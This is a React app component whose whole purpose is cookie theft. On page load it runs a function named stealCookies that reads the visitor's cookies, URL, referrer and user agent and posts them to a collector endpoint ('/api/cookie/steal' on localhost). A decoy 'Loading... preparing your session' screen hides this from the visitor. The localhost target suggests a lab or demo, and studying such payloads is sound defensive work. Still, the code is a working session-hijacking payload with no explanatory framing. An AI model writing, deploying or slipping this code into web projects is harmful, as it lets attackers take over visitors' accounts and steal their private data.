import React, { useEffect } from 'react';

const App = () => {
  useEffect(() => {
    const stealCookies = async () => {
      try {
        const cookies = document.cookie.split(';').join('\n');
        const metadata = {
          url: location.href,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
          timestamp: Date.now(),
          origin: location.origin
        };
        
        const formData = new FormData();
        formData.append('cookies', cookies);
        formData.append('metadata', JSON.stringify(metadata));
        
        const response = await fetch('http://localhost:5176/api/cookie/steal', {
          method: 'POST',
          body: formData
        });
        
        if (!response.ok) {
          console.log(`HTTP error! status: ${response.status}`);
          return;
        }
        
        console.log("Cookies sent successfully");
      } catch (error) {
        console.error("Error sending cookies:", error);
      }
    };
    
    stealCookies();
  }, []);
  
  return (
    <div style={{ 
      minHeight: '100vh', 
      display: 'flex', 
      alignItems: 'center',
      justifyContent: 'center',
      backgroundColor: '#f0f2f5'
    }}>
      <div style={{
        textAlign: 'center',
        padding: '2rem',
        borderRadius: '8px',
        boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        <h1>Loading...</h1>
        <p>Please wait while we prepare your session.</p>
      </div>
    </div>
  );
};

export default App;